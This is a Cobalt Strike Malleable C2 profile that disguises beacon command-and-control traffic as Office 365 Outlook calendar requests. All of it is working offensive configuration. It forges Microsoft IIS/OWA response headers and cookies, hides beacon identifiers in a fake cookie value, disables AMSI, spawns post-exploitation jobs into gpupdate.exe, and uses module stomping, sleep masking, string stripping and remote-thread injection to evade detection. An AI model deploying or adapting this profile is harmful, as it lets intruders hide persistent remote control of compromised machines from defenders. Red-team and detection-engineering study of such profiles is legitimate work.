#office365 calendar view
#office365 www.office.com redirects to outlook.live.com
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
}

http-get {

    set uri "/owa/";
    
    client {

#	header "Host" "outlook.live.com";
	header "Accept" "*/*";
	header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs";
        
        metadata {
            base64url;
            parameter "wa";


        }

	parameter "path" "/calendar";

    }

    server {

	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "Microsoft-IIS/10.0";
	header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
	header "X-CalculatedBETarget" "BY2PR06MB549.namprd06.prod.outlook.com";
	header "X-Content-Type-Options" "nosniff";
	header "X-OWA-Version" "15.1.1240.20";
	header "X-OWA-OWSVersion" "V2017_06_15";
	header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-DiagInfo" "BY2PR06MB549";
	header "X-UA-Compatible" "IE=EmulateIE7";
	header "X-Powered-By" "ASP.NET";
	header "X-FEServer" "CY4PR02CA0010";
	header "Connection" "close";
        

        output {
            base64url;
            print;
        }
    }
}

http-post {
    
    set uri "/OWA/";
    set verb "GET";

    client {

#	header "Host" "outlook.live.com";
	header "Accept" "*/*";     
        
        output {
            base64url;
	    parameter "wa";


        }


	#hiding data in cookie value 'wla42='
        id {
            base64url;

	    prepend "wla42=";
	    prepend "xid=730bf7;";
	    prepend "MSPAuth=3EkAjDKjI;";
	    prepend "ClientId=1C0F6C5D910F9;";
	    prepend "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;";
	    header "Cookie";


        }
    }

    server {

	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Content-Type" "text/html; charset=utf-8";
	header "Server" "Microsoft-IIS/10.0";
	header "request-id" "6cfcf35d-0680-4853-98c4-b16723708fc9";
	header "X-CalculatedBETarget" "BY2PR06MB549.namprd06.prod.outlook.com";
	header "X-Content-Type-Options" "nosniff";
	header "X-OWA-Version" "15.1.1240.20";
	header "X-OWA-OWSVersion" "V2017_06_15";
	header "X-OWA-MinimumSupportedOWSVersion" "V2_6";
	header "X-Frame-Options" "SAMEORIGIN";
	header "X-DiagInfo" "BY2PR06MB549";
	header "X-UA-Compatible" "IE=EmulateIE7";
	header "X-Powered-By" "ASP.NET";
	header "X-FEServer" "CY4PR02CA0010";
	header "Connection" "close";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {

    set uri_x86 "/rpc";
    set uri_x64 "/Rpc";

    client {
#        header "Host" "outlook.live.com";
	header "Accept" "*/*";
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";    

    }


}

###Malleable PE Options###

post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}

#use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
#don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
stage {
    set checksum       "0";
    set compile_time   "25 Oct 2016 01:57:23";
    set entry_point    "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	   "WWanMM.dll";
    set userwx 	   "false";
    set cleanup	   "true";
    set sleep_mask	   "true";
    set stomppe	   "true";
    set obfuscate	   "true";
    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    #obfuscate beacon before sleep.
    set sleep_mask "true";

#module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }
}

process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}    
